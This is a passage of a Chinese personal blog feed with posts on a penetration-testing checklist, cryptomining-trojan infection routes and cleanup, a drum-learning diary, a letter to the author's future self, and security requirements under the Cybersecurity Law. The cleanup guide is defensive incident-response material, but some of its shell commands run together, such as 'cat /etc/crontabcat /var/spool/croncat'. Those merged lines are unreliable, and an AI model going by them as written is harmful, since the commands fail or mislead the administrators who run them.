title="渗透测试"></a>渗透测试</h2><p>渗透测试主要是模拟黑客的攻击手法，通过自动化漏洞扫描工具结合手工测试的方式对系统进行无害化的安全评估。渗透测试包含应用安全测试和业务安全测试两部分，应用安全测试包括但不限于如下内容：</p><table><thead><tr><th>序号</th><th>应用安全检查项</th><th>检查项说明</th></tr></thead><tbody><tr><td>1</td><td>注入类攻击</td><td>注入攻击漏洞，例如SQL，OS以及LOAP注入，这些攻击发生在当不可信的数据作为命令或者查询语句的一部分，被发送给解释器的时候，攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者访问未授权的数据。</td></tr><tr><td>2</td><td>跨站脚本（XSS）</td><td>当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送给一个网页浏览器，这就会产生跨站脚本攻击（简称XSS）。XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站、或者将用户转向恶意网站。</td></tr><tr><td>3</td><td>失效的身份认证和会话管理</td><td>与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、秘钥、会话令牌或攻击其他的漏洞去冒充其他用户的身份</td></tr><tr><td>4</td><td>不安全的直接对象引用</td><td>当开发人员暴露一个对内部实现对象的引用时，例如，一个文件、目录或数据库秘钥，就会产生一个不安全的直接对象引用，在没有访问控制检测或者其他保护时，攻击者会操作这些引用去访问未授权数据。</td></tr><tr><td>5</td><td>跨站请求伪造</td><td>一个跨站请求伪造攻击迫使登陆用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送到一个存在漏洞的web应用程序，这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，而这些请求会被应用程序认为是用户的合法请求。</td></tr><tr><td>6</td><td>安全配置错误</td><td>好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台，定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、实施和维护所有这些设置。这包括了对所有的软件保持及时地更新，包括所有应用程序的库文件。</td></tr><tr><td>7</td><td>不安全的加密存储</td><td>许多web应用程序并没有使用恰当的加密措施或Hash算法保护敏刚数据，比如信用卡、身份证等等。攻击者可能利用这种弱保护数据实行身份盗窃、信用卡诈骗或其他犯罪。</td></tr><tr><td>8</td><td>没有限制URL访问</td><td>许多web应用程序在显示受保护的链接和按钮之前会检测URL访问权限。但是，当这些页面被访问是，应用程序也需要执行类似的访问控制检测，否则攻击者将可以伪造这些URL去访问隐藏的页面</td></tr><tr><td>9</td><td>传输层的保护不足</td><td>应用程序时常没有进行身份认证，加密措施，甚至没有保护敏感网络数据的保密性和完整性。而当进行保护时，应用程序有时采用弱算法，使用过期或者无效的证书，或不正确地使用这些技术。</td></tr><tr><td>10</td><td>未验证的重定向和转发</td><td>WEB应用程序经常将用户重新定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面，如果没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站，或者使用转发去访问未授权的页面</td></tr></tbody></table><p>业务安全测试包括但不限于如下内容：</p><table><thead><tr><th>序号</th><th>业务安全检查项</th><th>检查项说明</th></tr></thead><tbody><tr><td>1</td><td>身份认证管理</td><td>该项测试主要针对身份认证环节，以及在非授权情况下访问一些授权用户才能访问的页面，或进行授权用户的操作。</td></tr><tr><td>2</td><td>业务一致性</td><td>该项测试主要针对办理业务过程中用户的身份与用户办理的业务是否相关联一直的安全测试</td></tr><tr><td>3</td><td>业务授权安全</td><td>该项测试主要针对于是否存在非授权情况下访问一些授权用户才能访问的页面，或进行授权用户的操作。</td></tr><tr><td>4</td><td>用户输入合法性验证</td><td>Web应用程序没有对用户输入数据的合法性进行判断，就会使应用程序存在安全隐患。从而容易受到跨站脚本及SQL注入等攻击</td></tr><tr><td>5</td><td>误操作回退</td><td>手动进行误操作尝试，看系统是否能够正确回滚。例如，交易操作，在购买未完成时异常退出，看系统是否能够自动释放被购买物的锁定状态。又例如办理操作，如话费套餐变更，更改过程出错或异常退出是否能正确回滚到办理之前的状态</td></tr><tr><td>6</td><td>验证码机制</td><td>验证码控制是一种由WEB应用程序生成的随机数，以确保用户提交的请求不是由bot生成。</td></tr><tr><td>7</td><td>业务数据篡改</td><td>该项测试主要针对于办理业务过程中用户浏览器端传递至服务端的字段篡改测试。</td></tr><tr><td>8</td><td>业务流乱序</td><td>该项测试主要针对业务的处理流程是否有正常的顺序，确保不会通过技术手段绕过某些重要流程步骤。</td></tr><tr><td>9</td><td>信息正确呈现</td><td>对于用户提交的请求，是否能够返回用户需要的页面信息。</td></tr><tr><td>10</td><td>业务接口恶意调用</td><td>1.对于敏感的业务接口，是否预先有身份认证机制？查看此类可能被恶意大规模调用的业务接口，如用户登录模块、密码找回、密码重置等等。<br>2.对于具有查询展示办理功能的业务皆苦，如果不需要身份认证是否有强制验证码机制防止机器人程序等自动化大规模的恶意调用。</td></tr></tbody></table><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写给两年后2025年的自己</title>
      <link href="/posts/c33148ad/"/>
      <url>/posts/c33148ad/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230228/%E8%87%B4%E6%9C%AA%E6%9D%A5.png" alt="致未来"></p><p>2025年的我应该是实现了架子鼓演奏自由，可以轻松的驾驭并享受架子鼓演奏带来的愉悦和快乐。可以很自信的在抖音或B站上上传自己平时很惬意的架子鼓日常练习，不用再担心有人说”节奏不稳、勉强还行”了。技巧应该很熟了，什么重轻音、滚奏、双踩都不在话下了，16分节奏型速度在120以上那都是小case，可以挑战一些有难度的歌曲了。可以很有底气的说我会打架子鼓！要不要来表演一段？</p><p>2025年的我应该是实现了英语阅读的自由，可以享受在英语文献中获取知识带来的快乐，可以不带字幕的看懂大部分的美剧大片了。不用再忍受看一页原版英语小说还要不停的翻英汉字典，搞得阅读兴趣全无了。应该可以畅快的看懂英文的计算机相关的技术文档了，可以尝试翻译英文技术文档了。</p><p>2025年的我技术能力水平应该更高了，心智更加成熟，思考更加有深度了，更加乐意写技术文章做技术分享了。CSDN账号的粉丝应该是到了10W，可以小小的嘚瑟一下了！</p><p>2025年的我还没有达到财富自由，上班还是在上班，但心态没有这么累了，应该是在享受工作了。开了多年的老爷车应该是换了，换成了新能源的混动车，偶尔可以开着新车去旅行，感受不一样的风景了。</p><p><strong>如今的各种不如意，都是来自于过去的不努力！</strong></p><p><strong>2025年的我，要感谢现在努力的自己！</strong></p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之认识挖矿木马</title>
      <link href="/posts/2f88a4b/"/>
      <url>/posts/2f88a4b/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是挖矿木马？"><a href="#一、什么是挖矿木马？" class="headerlink" title="一、什么是挖矿木马？"></a>一、什么是挖矿木马？</h2><p>比特币是以区块链技术为基础的虚拟加密货币，比特币具有匿名性和难以追踪的特点，经过十余年的发展，已成为网络黑产最爱使用的交易媒介。大多数勒索病毒在加密受害者数据后，会勒索代价高昂的比特币。比特币在2021年曾达到1枚6.4万美元的天价，比特币的获得需要高性能计算机（又称矿机，一般配置顶级CPU和GPU）按特定算法计算，计算的过程被形象的称为“挖矿”。</p><p>矿机价格昂贵，为生产比特币，有人不惜重金购置大量矿机组成网络集群挖矿。挖矿又非常耗电，因此矿场往往会寻找偏僻地区的小水电、小火电而建，因为电费便宜，有人为节约成本偷电挖矿。</p><p>当数字加密币市值暴涨时，挖矿业务会水涨船高，高端CPU、GPU、高端显卡、大容量硬盘被炒上天价还卖断货。目前，我国政府宣布要实现碳达峰碳中和的目标，严重耗能的虚拟加密币相关生产、交易被认定为非法，我国境内所有（生产加密货币的）矿场必须关闭。</p><p>因挖矿需要大量财力投入，从一开始，就有人想到利用木马控制他人的计算机组建僵尸网络集群挖矿的办法，这就是所谓“挖矿木马”。</p><p>不法分子通过各种非法手段将矿机程序植入受害者的计算机中，利用受害者计算机的运算能力进行挖矿活动，从而获取非法收益。这类非法侵入用户计算机的矿机程序被称作挖矿木马病毒。</p><h2 id="二、挖矿木马的主要入侵方式"><a href="#二、挖矿木马的主要入侵方式" class="headerlink" title="二、挖矿木马的主要入侵方式"></a>二、挖矿木马的主要入侵方式</h2><p>挖矿木马常见的攻击方式及攻击后果可以参考下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230222/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%85%A5%E4%BE%B5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="挖矿木马的主要入侵方式"></p><h3 id="1、漏洞攻击"><a href="#1、漏洞攻击" class="headerlink" title="1、漏洞攻击"></a>1、漏洞攻击</h3><p>利用系统漏洞快速获取相关服务器权限，植入挖矿木马是目前最为普遍的传播方式之一。常见的漏洞包括Windows系统漏洞、服务器组件插件漏洞、中间件漏洞、Web漏洞等。例如传播较广的WannaMine挖矿家族，利用了永恒之蓝漏洞在内网蠕虫式传播，给不少公司和机构带来巨大损失。</p><h3 id="2、弱口令爆破"><a href="#2、弱口令爆破" class="headerlink" title="2、弱口令爆破"></a>2、弱口令爆破</h3><p>弱口令指的是仅包含简单口令、有规律的键盘组合或历次泄漏过的密码，攻击者通常会针对redis、ssh、3389、mssql、IPC$等服务进行爆破弱口令攻击。爆破成功后，尝试获取系统权限，植入挖矿木马并设置持久化。</p><h3 id="3、伪装正常软件"><a href="#3、伪装正常软件" class="headerlink" title="3、伪装正常软件"></a>3、伪装正常软件</h3><p>攻击者将挖矿木马伪装为游戏软件、娱乐社交软件、安全软件、游戏外挂等进行传播，欺骗用户下载并执行。由于多数游戏对显卡、CPU等硬件性能要求较高，故挖矿木马通常伪装成游戏辅助外挂，通过社交群、网盘等渠道传播，感染大量机器。</p><h2 id="三、挖矿木马的安全危害"><a href="#三、挖矿木马的安全危害" class="headerlink" title="三、挖矿木马的安全危害"></a>三、挖矿木马的安全危害</h2><p>挖矿木马攻击，就是发生率较高，极可能造成业务系统中断的威胁事件，挖矿木马最明显的影响是大量消耗系统资源，使系统其他软件或服务运行缓慢，性能变差。主要安全危害包括业务故障、资源损耗及其他的安全威胁。</p><h3 id="1、业务故障"><a href="#1、业务故障" class="headerlink" title="1、业务故障"></a>1、业务故障</h3><p>挖矿木马会占用CPU进行超频运算，从而占用主机大量的CPU资源，导致设备性能不足，业务访问缓慢，设备过载宕机重启，异常网络链接等问题，严重影响服务器上的其他应用的正常运行，最终会影响业务系统工作运行。</p><h3 id="2、资源损耗"><a href="#2、资源损耗" class="headerlink" title="2、资源损耗"></a>2、资源损耗</h3><p>挖矿木马的挖矿活动会使设备各器件高速运行，产生大量热能，增加电能消耗，加速设备器件老化等问题，造成资源损耗浪费。</p><h3 id="3、安全威胁"><a href="#3、安全威胁" class="headerlink" title="3、安全威胁"></a>3、安全威胁</h3><p>挖矿木马作为一款应用程序，在服务器中运行，其拥有服务器权限，对服务器主机产生安全威胁。部分挖矿木马还具备蠕虫化的特点，在主机被成功入侵之后，挖矿木马还会向内网渗透，并在被入侵的服务器上持久化驻留以获取最大收益。</p><h2 id="四、挖矿木马的检测手段"><a href="#四、挖矿木马的检测手段" class="headerlink" title="四、挖矿木马的检测手段"></a>四、挖矿木马的检测手段</h2><h3 id="1、挖矿主机指纹识别"><a href="#1、挖矿主机指纹识别" class="headerlink" title="1、挖矿主机指纹识别"></a>1、挖矿主机指纹识别</h3><p>通过主机探测平台内置指纹知识库，如：Body特征、Header特征，对挖矿木马指纹进行识别，进而发现感染挖矿木马主机资产。</p><h3 id="2、挖矿主机端口识别"><a href="#2、挖矿主机端口识别" class="headerlink" title="2、挖矿主机端口识别"></a>2、挖矿主机端口识别</h3><p>通过研究分析目前主流的挖矿木马类型存在的通信端口，感染主机的标记端口等，形成挖矿木马常用端口知识库，并对资产开放端口进行聚合分析，探测这些端口的指纹信息进行识别和确认。</p><h3 id="3、挖矿主机协议检测"><a href="#3、挖矿主机协议检测" class="headerlink" title="3、挖矿主机协议检测"></a>3、挖矿主机协议检测</h3><p>通过挖矿木马的通信协议特征，对比分析网络资产开放的服务协议，定位存在挖矿木马感染风险的资产主机。</p><h3 id="4、IOC威胁情报关联检测"><a href="#4、IOC威胁情报关联检测" class="headerlink" title="4、IOC威胁情报关联检测"></a>4、IOC威胁情报关联检测</h3><p>通过大数据威胁情报，实时更新最新的挖矿木马情报。包括挖矿木马家族使用的C&amp;C域名、恶意文件hash、矿池域名和IP、挖矿木马使用的加密货币钱包地址等进行挖矿木马流量检测告警。</p><h3 id="5、挖矿木马行为特征检测"><a href="#5、挖矿木马行为特征检测" class="headerlink" title="5、挖矿木马行为特征检测"></a>5、挖矿木马行为特征检测</h3><p>通过网络流量检测分析引擎，对其挖矿木马通信的端口、协议、内容、行为特征、恶意文件检测等挖矿木马流量特征进行检测分析，定位出存在恶意挖矿行为的终端及主机。</p><h3 id="6、DNS流量检测挖矿域名"><a href="#6、DNS流量检测挖矿域名" class="headerlink" title="6、DNS流量检测挖矿域名"></a>6、DNS流量检测挖矿域名</h3><p>通过DNS威胁流量检测，基于域名分析算法结合威胁情报系统对C&amp;C域名、挖矿网站域名、DNS解析IP等进行聚类分析，进而发现内网存在的恶意挖矿行为。</p><h2 id="五、挖矿木马的清理"><a href="#五、挖矿木马的清理" class="headerlink" title="五、挖矿木马的清理"></a>五、挖矿木马的清理</h2><p>参考网上给出的腾讯安全专家撰写的《挖矿木马自助清理手册》的挖矿木马清理步骤和方法：</p><h3 id="1、及时隔离主机"><a href="#1、及时隔离主机" class="headerlink" title="1、及时隔离主机"></a>1、及时隔离主机</h3><p>部分带有蠕虫功能的挖矿木马在取得主机的控制权后，会继续对公网的其他主机，或者以当前主机作为跳板机对同一局域网内的其他主机进行横向渗透，所以在发现主机被植入挖矿木马后，在不影响业务正常运行的前提下，应该及时隔离受感染的主机，然后进行下一步分析和清除工作。</p><h3 id="2、阻断异常网络通信"><a href="#2、阻断异常网络通信" class="headerlink" title="2、阻断异常网络通信"></a>2、阻断异常网络通信</h3><p>挖矿木马不仅会连接矿池，还有可能会连接黑客的C2服务器，接收并执行C2指令、投递其他恶意木马，所以需要及时进行网络阻断。<br>（1）检查主机防火墙当前生效的iptables规则中是否存在业务范围之外的可疑地址和端口，它们可能是挖矿木马的矿池或C2地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure><p>（2）从iptables规则中清除可疑地址和端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><p>（3）阻断挖矿木马的网络通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 可疑地址 -j DROP</span><br><span class="line">iptables -A OUTPUT -d 可疑地址 -j DROP</span><br></pre></td></tr></table></figure><h3 id="3、清除计划任务"><a href="#3、清除计划任务" class="headerlink" title="3、清除计划任务"></a>3、清除计划任务</h3><p>大部分挖矿木马会通过在受感染主机中写入计划任务实现持久化，如果仅仅只是清除挖矿进程，无法将其根除，到了预设的时间点，系统会通过计划任务从黑客的C2服务器重新下载并执行挖矿木马。<br>可以通过执行如下命令查看是否存在可疑定时任务，若有，则先保存相关记录用于后续分析，再进行删除：<br>查看系统当前用户的计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>查看系统特定用户的计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -u username -l</span><br></pre></td></tr></table></figure><p>查看其他计划任务文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontabcat /var/spool/croncat /etc/anacrontabcat /etc/cron.d/cat /etc/cron.daily/cat /etc/cron.hourly/cat /etc/cron.weekly/cat /etc/cron.monthly/cat /var/spool/cron/</span><br></pre></td></tr></table></figure><h3 id="4、清除启动项"><a href="#4、清除启动项" class="headerlink" title="4、清除启动项"></a>4、清除启动项</h3><p>除了计划任务，挖矿木马通过添加启动项同样能实现持久化。可以使用如下命令查看开机启动项中是否有异常的启动服务。<br>CentOS7以下版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig –list</span><br></pre></td></tr></table></figure><p>CentOS7及以上版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><p>如果发现有恶意启动项，可以通过如下命令进行关闭：<br>CentOS7以下版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig 服务名 off</span><br></pre></td></tr></table></figure><p>CentOS7及以上版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> 服务名</span><br></pre></td></tr></table></figure><p>另外，还需要仔细排查以下目录及文件，及时删除可疑的启动项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/systemd/system</span><br><span class="line">/usr/lib/systemd/system/multi-user.target.wants</span><br><span class="line">/etc/rc.local</span><br><span class="line">/etc/inittab</span><br><span class="line">/etc/rc0.d/</span><br><span class="line">/etc/rc1.d/</span><br><span class="line">/etc/rc2.d/</span><br><span class="line">/etc/rc3.d/</span><br><span class="line">/etc/rc4.d/</span><br><span class="line">/etc/rc5.d/</span><br><span class="line">/etc/rc6.d/</span><br><span class="line">/etc/rc.d/</span><br></pre></td></tr></table></figure><p>排查的时候，可以按照文件修改时间来排序，重点排查近期被创建服务项。</p><h3 id="5、清除预加载so"><a href="#5、清除预加载so" class="headerlink" title="5、清除预加载so"></a>5、清除预加载so</h3><p>通过配置/etc/ld.so.preload，可以自定义程序运行前优先加载的动态链接库，部分木马通过修改该文件，添加恶意so文件，从而实现挖矿进程的隐藏等恶意功能。<br>检查/etc/ld.so.preload（该文件默认为空），清除异常的动态链接库。</p><h3 id="6、清除SSH公钥"><a href="#6、清除SSH公钥" class="headerlink" title="6、清除SSH公钥"></a>6、清除SSH公钥</h3><p>挖矿木马通常还会在  ~/.ssh/authoruzed_keys 文件中写入黑客的SSH公钥，这样子就算用户将挖矿木马清除得一干二净，黑客还是可以免密登陆该主机，这也是常见的保持服务器控制权的手段。<br>排查 ~/.ssh/authorized_keys文件 ，如果发现可疑的SSH公钥，直接删除。</p><h3 id="7、清除挖矿木马"><a href="#7、清除挖矿木马" class="headerlink" title="7、清除挖矿木马"></a>7、清除挖矿木马</h3><p>（1）清除挖矿进程<br>挖矿木马最大的特点就是会在用户不知情的情况下，利用主机的算力进行挖矿，从而消耗主机大量的CPU资源，所以，通过执行如下命令排查系统中占用大量CPU资源的进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -cps -ef</span><br></pre></td></tr></table></figure><p>确认相关进程为挖矿进程后，按照如下步骤将其清除：<br>获取并记录挖矿进程的文件路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure><p>杀死挖矿进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 <span class="variable">$PID</span></span><br></pre></td></tr></table></figure><p>删除挖矿进程对应的文件<br>（2）清除其它相关恶意进程<br>恶意进程与外部的C2服务器进行通信时，往往会开启端口进行监听。执行如下命令，查看服务器是否有未被授权的端口被监听。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure><p>若有未授权进程，按照如下步骤将其清除：<br>获取并记录未授权进程的文件路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure><p>杀死未授权进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 <span class="variable">$PID</span></span><br></pre></td></tr></table></figure><p>删除未授权进程对应的文件<br>还可以通过如下命令排查近期新增的文件，清除相关木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc -ctime -2 （这里指定目录为/etc，获取近2天内的新增文件）lsof</span><br></pre></td></tr></table></figure><h3 id="8、风险排查、安全加固"><a href="#8、风险排查、安全加固" class="headerlink" title="8、风险排查、安全加固"></a>8、风险排查、安全加固</h3><p>对系统进行风险排查和安全加固，避免挖矿木马卷土重来。</p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任何说30天快速学会架子鼓的都是骗人的!</title>
      <link href="/posts/ba190f8/"/>
      <url>/posts/ba190f8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230218/%E9%AD%94%E9%B2%A8%E6%9E%B6%E5%AD%90%E9%BC%93.png" alt="架子鼓"></p><center>架子鼓</center>从去年的圣诞节报了架子鼓的班以后，过了一年多了，发现自己这个架子鼓还没有入门！！！<p>报班的时候感觉信心满满，这架子鼓不就是拿个鼓槌敲来敲去，这还不容易学？而且刷抖音、B站上大把的都是30天快速入门、一个月学会打《逆战》，看得我天真的认为我也能行。现实让我啪啪的打脸，过了一年多了，发现还没有入门，只会打简单的动次打次，敲最简单的《yellow》。</p><p>回顾一年多学习架子鼓的历程：</p><p>头三个月，才报完班，兴致满满，每周都想约老师上课，由于没有买鼓也没有去鼓房去练习，所以每次上课的时候总是被老师打击”你这个根本就没有练习啊”，或者是”你这上节课的内容还没有练熟啊”，硬着头皮去上课发现头半节课是在练习，后半节课老师匆匆讲一、两个知识点或教一、两个手法。由于完全是零基础老师讲时值，全音符、4分、8分、16分音符等乐理知识，听得得自己一头雾水；教手法是一听就会，一练就费。就这么稀里糊涂的上了大概7节课后，这个信心被打击得不行了，上课的兴趣没有那么大了。想想，这样下去也不是办法，关键是没有条件练习，既然想学好架子鼓，还是得自己买个鼓！于是花了近4千大洋买了个电鼓。</p><p>自己有了鼓以后果然兴致又大增。鼓刚到的几天，天天在家练。毕竟咱也是成熟的大人了，知道要学好一门乐器，师傅领进门，修行靠个人，需要自己花时间慢慢的练习。又碰上疫情不断，老师也不能上课。于是自己在B站上找架子鼓视频，今天看到一个新手小白必练节奏型，明天看到一个架子鼓新手快速入门。今天看到这个视频好，练了几天，明天发现另外一个视频可能更适合，又开始跟着这个视频练，练了几天后发现因为不成体系，东练一下西练一下啥都没有学会。又想去找老师线下教，把剩下的几节课上完，结果发现因为疫情原因，报名学鼓的地方老板已经搞不下去，教学点已经转让了。联系了几次老板，老板抱怨说”过了这么久我都已经撑不下去不搞了，你们怎么12节课都还没有学完？”后来根本就不理我们了。</p><p>开了个头，总得要学出个名堂来吧？回顾这段学鼓的历程，无疑是段失败的学鼓之路。总结一下，自己学鼓没有目标，不了解学习架子鼓的整个技能知识结构、像个无头苍蝇一样不知道如何有计划的学习和训练，想依赖老师确又没有按照老师的节奏来，把学乐器想得太简单了，不可能通过短短的12次课时就可能把架子鼓学会。人家30天入门、一个月打歌，那基本上都是有基础的，而且是每天都花了大量的时间在练习。个人认为正常情况零基础的学习者没有经过一两年有体系有计划的训练是很难流畅的打好一首中等难度的歌曲的。</p><p>痛定思痛，为了学好架子鼓，我开始思考并改变策略。不再无脑的跟B站那些免费的视频教程了，因为大部分免费的视频教程都有个很大的问题就是不成体系。为此我买了一本《成人零基础学架子鼓》的教材，详细了解要学习架子鼓的整体的体系框架，现在知道了学习架子鼓得知道基本的握槌击打方法、套鼓的组成及击打方式、4分、8分、16分、休止符、基本节奏型、还有前8后16、前16后8、切分、附点等等，这些都是需要一个个的去理解理会，通过不断的练习来熟练掌握的。有了这些基本功后才有可能通过组合应用到实战歌曲里面来完成打一首完整的歌曲。为了更好的掌握这些基本功的练习方法，我在抖音上花了499买了一套完整的视频教学课程，可以跟着课程将这些基本功及常用的技巧进行练习。剩下的就是抛弃速成的幻想，扎扎实实一步步的开始练习了。</p><p>今年的目标是扎扎实实的把基本功练好，拿下最初定下来的《大风吹》这首歌！</p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架子鼓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全保障之“三同步”</title>
      <link href="/posts/955b1d60/"/>
      <url>/posts/955b1d60/</url>
      
        <content type="html"><![CDATA[<blockquote><p>建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。<br>                                                                                                                                                               <p align='right'>–《网络安全法》第三十三条 </p></p></blockquote><p>信息系统的生命周期层面和安全保障要素层面不是相互孤立的，而是相互关联、密不可分的。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230206/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%A8%A1%E5%9E%8B.png" alt="信息系统安全保障生命周期的安全保障要素"><br>在信息系统生命周期模型中，将信息系统的整个生命周期抽象成计划组织、开发采购、实施交付、运行维护和废弃5个阶段，加上在运行维护阶段的变更产生的反馈，形成信息系统生命周期完整的闭环结构。在信息系统生命周期中的任何时间点上，都需要综合信息系统安全保障的技术、管理、工程和人员保障要素。从信息系统建设开始，就应该综合考虑系统的安全保障要求，确保信息系统建设和信息系统安全保障建设同步规划、同步实施。也就是我们平时讲的<strong>信息系统和安全保障要“三同步”–同步规划、同步建设、同步使用</strong>。</p><ul><li><strong>同步规划</strong></li></ul><p>关键信息基础设施运营者应：<br>a）同步分析安全需求，即在关键信息基础设施建设或改建之初，从本组织的职能或业务的角度分析对关键信息基础设施实施网络安全的需求，形成安全需求说明书。<br>b）同步定义安全要求，即基于网络安全需求说明书，定义关键信息基础设施的网络安全要求，形成网络安全功能和性能说明书。<br>c）确保安全需求说明书得到网络安全责任部门签字认可。</p><ul><li><strong>同步建设</strong></li></ul><p>关键信息基础设施运营者应：<br>a）同步设计安全体系结构，即基于已经定义的关键信息基础设施的网络安全要求，设计网络安全体系结构，明确系统内的各类信息安全组件，说明各组件提供的信息安全服务及可能的实现机制。<br>b）同步开展详细的安全设计，即根据安全保护等级选择基本安全措施，细化安全机制在关键信息基础设施中的具体实现。<br>c）在建设或改建过程中，按照GB/T 22239工程实施相应等级的要求，同步建设符合其等级要求的网络安全设施，包括自行软件开发。<br>d）建设完成后，组织对关键信息基础设施进行验收并将网络安全作为验收的重要内容。</p><ul><li><strong>同步使用</strong></li></ul><p>关键信息基础设施运营者应：<br>a）同步运行安全设施，确保安全设施保持启用状态。<br>b）按照GB/T 22239安全运维管理相应等级的要求进行安全运维。<br>c）关键信息基础设施及其运行环境发生明显变化时，评估其风险，及时升级安全设施并实施变更管理。<br>d）对安全设施同步实施配置管理，包括制定配置管理计划，制定、记录、维护基线配置，保留基线配置的历史版本，便于必要时恢复历史配置。</p><hr><p>博客地址：<a 